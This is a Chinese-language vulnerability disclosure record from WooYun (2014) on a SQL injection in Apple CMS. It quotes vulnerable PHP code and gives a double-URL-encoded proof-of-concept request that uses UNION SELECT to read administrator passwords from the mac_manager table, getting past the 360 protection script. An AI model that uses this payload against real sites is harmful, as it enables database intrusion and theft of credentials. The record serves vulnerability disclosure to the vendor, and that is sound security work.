{"id": 53860, "wybug_id": "wooyun-2014-066263", "wybug_title": "苹果CMS绕过检测SQL注入，第四发（绕过360防护）", "wybug_corp": "maccms.com", "wybug_author": "magerx", "wybug_date": "2014-06-26 10:59", "wybug_open_date": "2014-09-24 11:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-24：\t细节向公众公开  简要描述： 原来我之前说的那些都成废话了，厂商没有看懂，囧～，看回复把过错归结于360_safe3.php，不再发了，总结下原因。 详细说明：  index.php:\n$m = be('get','m');    if(strpos($m,'.')){ $m = substr($m,0,strpos($m,'.')); }    $par = explode('-',$m);    $parlen = count($par);    $ac = $par[0];        if(empty($ac)){ $ac='vod'; $method='index'; }        $colnum = array(\"id\",\"pg\",\"yaer\",\"typeid\",\"classid\");    if($parlen>=2){    \t$method = $par[1];    \t for($i=2;$i<$parlen;$i+=2){            $tpl->P[$par[$i]] = in_array($par[$i],$colnum) ? intval($par[$i+1]) : urldecode($par[$i+1]);        }    }    if($tpl->P['pg']<1){ $tpl->P['pg']=1; }    unset($colnum);    $acs = array('vod','art','map','user','gbook','comment','label');    if(in_array($ac,$acs)){    \t$tpl->P[\"module\"] = $ac;    \tinclude MAC_ROOT.'/inc/module/'.$ac.'.php';    }\n上面可以看到传递过来的参数$m经过be()转移看似很安全，-号分割数组后遇到神奇的$colnum,在$colnum中的变量intval处理，不在的呢？直接urldecode,我虽然没看明白为什么这样，当然最后得看这些变量会传递到哪里，所以这里难道仅仅是一个year写成yaer所造成的注入么，继续往下看，下面会包含inc/module/$ac.php所以我们先看看vod.php:\nelseif($method=='search'){\t$tpl->P[\"siteaid\"] = 15;\t$wd = be(\"all\", \"wd\");\t\tif(!empty($wd)){\t\t$tpl->P[\"wd\"] = $wd;\t}\t\t//if(isN($tpl->P[\"wd\"]) && isN($tpl->P[\"ids\"]) && isN($tpl->P[\"pinyin\"]) && isN($tpl->P[\"starring\"]) && isN($tpl->P[\"directed\"]) && isN($tpl->P[\"area\"]) && isN($tpl->P[\"lang\"]) && isN($tpl->P[\"year\"]) && isN($tpl->P[\"letter\"]) && isN($tpl->P[\"tag\"]) && isN($tpl->P[\"type\"]) && isN($tpl->P[\"typeid\"]) && isN($tpl->P[\"classid\"]) ){ alert (\"搜索参数不正确\"); }\t    $tpl->P['cp'] = 'vodsearch';\t$tpl->P['cn'] = urlencode($tpl->P['wd']).'-'.$tpl->P['pg'].'-'.$tpl->P['order'].'-'.$tpl->P['by'].'-'.$tpl->P['ids']. '-'.$tpl->P['pinyin']. '-'.$tpl->P['type'].  '-'.$tpl->P['year']. '-'.$tpl->P['letter'].'-'.$tpl->P['typeid'].'-'.$tpl->P['classid'].'-'.urlencode($tpl->P['area']) .'-'.urlencode($tpl->P['lang'])  .'-'.urlencode($tpl->P['tag']) .'-'.urlencode($tpl->P['starring']) .'-'.urlencode($tpl->P['directed']) ;\techoPageCache($tpl->P['cp'],$tpl->P['cn']);\t\t\tif (!isN($tpl->P[\"year\"])){\t\t$tpl->P[\"key\"]=$tpl->P[\"year\"];\t\t$tpl->P[\"des\"] = $tpl->P[\"des\"] .\"&nbsp;上映年份为\".$tpl->P[\"year\"];\t\t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND d_year=\". $tpl->P[\"year\"] .\" \";\t}    if (!isN($tpl->P[\"letter\"])){    \t$tpl->P[\"key\"]=$tpl->P[\"letter\"];    \t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;首字母为\" . $tpl->P[\"letter\"];    \t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND d_letter='\" . $tpl->P[\"letter\"] .\"' \";    }    if(!isN($tpl->P[\"area\"])){    \t$tpl->P[\"key\"]=$tpl->P[\"area\"];    \t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;地区为\" . $tpl->P[\"area\"];    \t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND d_area='\" . $tpl->P[\"area\"] .\"' \";    }    if (!isN($tpl->P[\"lang\"])){    \t$tpl->P[\"key\"]=$tpl->P[\"lang\"];    \t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;语言为\" . $tpl->P[\"lang\"];    \t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND d_lang='\" . $tpl->P[\"lang\"] .\"' \";    }    if (!isN($tpl->P[\"wd\"])) {    \t$tpl->P[\"key\"]=$tpl->P[\"wd\"] ;    \t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;名称或主演为\" . $tpl->P[\"wd\"];    \t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND ( instr(d_name,'\".$tpl->P['wd'].\"')>0 or instr(d_starring,'\".$tpl->P['wd'].\"')>0 ) \";    }        if (!isN($tpl->P[\"pinyin\"])){    \t$tpl->P[\"key\"]=$tpl->P[\"pinyin\"] ;    \t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;拼音为\" . $tpl->P[\"pinyin\"];    \t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND instr(d_enname,'\".$tpl->P['pinyin'].\"')>0 \";    }\t    \tif (!isN($tpl->P[\"starring\"])){\t\t$tpl->P[\"key\"]=$tpl->P[\"starring\"] ;\t\t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;主演为\" . $tpl->P[\"starring\"];\t\t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND instr(d_starring,'\".$tpl->P['starring'].\"')>0 \";\t}\t\tif (!isN($tpl->P[\"directed\"])){\t\t$tpl->P[\"key\"]=$tpl->P[\"directed\"] ;\t\t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;导演为\" . $tpl->P[\"directed\"];\t\t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND instr(d_directed,'\".$tpl->P['directed'].\"')>0 \";\t}        if (!isN($tpl->P[\"tag\"])){\t\t$tpl->P[\"key\"]=$tpl->P[\"tag\"] ;\t\t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;Tag为\" . $tpl->P[\"tag\"];\t\t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND instr(d_tag,'\".$tpl->P['tag'].\"')>0 \";\t}\t    $tpl->P['typepid'] = 0;\tif(!isN($tpl->P[\"typeid\"])){\t\t$typearr = $MAC_CACHE['vodtype'][$tpl->P['typeid']];\t\tif (is_array($typearr)){\t\t\t$tpl->P['typepid'] = $typearr['t_pid'];\t\t\tif (isN($tpl->P[\"key\"])){ $tpl->P[\"key\"]= $typearr[\"t_name\"];  }\t\t\t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;分类为\" . $typearr[\"t_name\"];\t\t\t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND d_type in (\" . $typearr[\"childids\"] . \") \";\t\t}\t\tunset($typearr);\t}\tif(!isN($tpl->P[\"classid\"])){\t\t$classarr = $MAC_CACHE['vodclass'][$tpl->P['classid']];\t\tif (is_array($classarr)){\t\t\tif (isN($tpl->P[\"key\"])){ $tpl->P[\"key\"]= $classarr[\"c_name\"];  }\t\t\t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;剧情分类为\" . $classarr[\"c_name\"];\t\t\t$tpl->P[\"where\"] = $tpl->P[\"where\"] .  ' AND instr(d_class,\\','.$tpl->P['classid'].',\\')>0  ';\t\t}\t\tunset($classarr);\t}\t\t\t$db = new AppDb($MAC['db']['server'],$MAC['db']['user'],$MAC['db']['pass'],$MAC['db']['name']);\t$tpl->H = loadFile(MAC_ROOT_TEMPLATE.\"/vod_search.html\");\t$tpl->mark();\t$tpl->pageshow();\n如果说第一发是因为year写错了导致不在$colnum中，避过了自身be()的处理和360防护脚本，那下面的其他参数呢，比如letter,area,where,des,lang,pinying,等等这些都没有经过其他过滤，所以直接urldecode了一次，所以可以注入的地方就很多了。当然不仅仅是这个页面，module下的其他页面也存在这个问题，就请厂商自行排查了。   漏洞证明：  所以注入点很多，比如我们拿之前没有测试的letter来测试：\nhttp://localhost/maccms8/index.php?m=vod-search-letter-luren%2527%2520and%25201%253D2%2520union%2520select%2520m_password%2520from%2520mac_manager%2520order%2520by%25201%2520desc%2523-des-2019-where-and%25201%253D1-siteid-luren\n\n\n\n$colnum = array(\"id\",\"pg\",\"yaer\",\"typeid\",\"classid\");    if($parlen>=2){    \t$method = $par[1];    \t for($i=2;$i<$parlen;$i+=2){            $tpl->P[$par[$i]] = in_array($par[$i],$colnum) ? intval($par[$i+1]) : urldecode($par[$i+1]);        }\n这才是罪魁祸首，由这处错误引起的其他注入不再发了。   修复方案：  ～。～   版权声明：转载请注明来源 magerx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-06-26 11:48 厂商回复： 在0602版本中测试已经被脚本拦截。下载地址更新：http:/// 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}